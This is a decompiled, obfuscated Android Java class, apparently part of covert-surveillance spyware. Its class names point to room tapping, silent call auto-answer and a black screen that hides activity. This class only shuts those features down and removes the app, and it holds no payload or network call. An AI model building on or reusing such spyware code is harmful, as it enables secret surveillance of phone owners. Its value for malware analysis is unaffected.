package com.network.h;

import android.content.Context;
import com.network.android.a.b;
import com.network.android.agent.NetworkApp;
import com.network.android.roomTap.AutoAnswerReceiver;
import com.network.android.roomTap.BlackScreen;
import com.network.d.a;
import com.network.media.CoreReceiver;

/* access modifiers changed from: package-private */
public final class c implements Runnable {

    /* renamed from: a  reason: collision with root package name */
    final /* synthetic */ Context f144a;

    c(Context context) {
        this.f144a = context;
    }

    public final void run() {
        try {
            if (AutoAnswerReceiver.a()) {
                AutoAnswerReceiver.b(this.f144a);
            }
            com.network.android.a.c.c(this.f144a);
            b.a();
            BlackScreen.a(this.f144a, NetworkApp.a().getSharedPreferences("NetworkPreferences", 0));
            if (CoreReceiver.f161a != null) {
                CoreReceiver.f161a.a();
            }
            com.network.i.b.a().a(this.f144a);
            a.a();
            com.network.android.c.a.b.a(2, 113, "MOSQ_SERVICE_OFF");
            com.network.b.b.b(this.f144a);
            b.e(this.f144a);
        } catch (Throwable th) {
            com.network.android.c.a.a.a("removeAppalication: " + th.getMessage(), th);
        }
        try {
            b.e(this.f144a);
        } catch (Throwable th2) {
            com.network.android.c.a.a.a("removeAppalication: " + th2.getMessage(), th2);
            b.f143a = false;
        }
    }
}
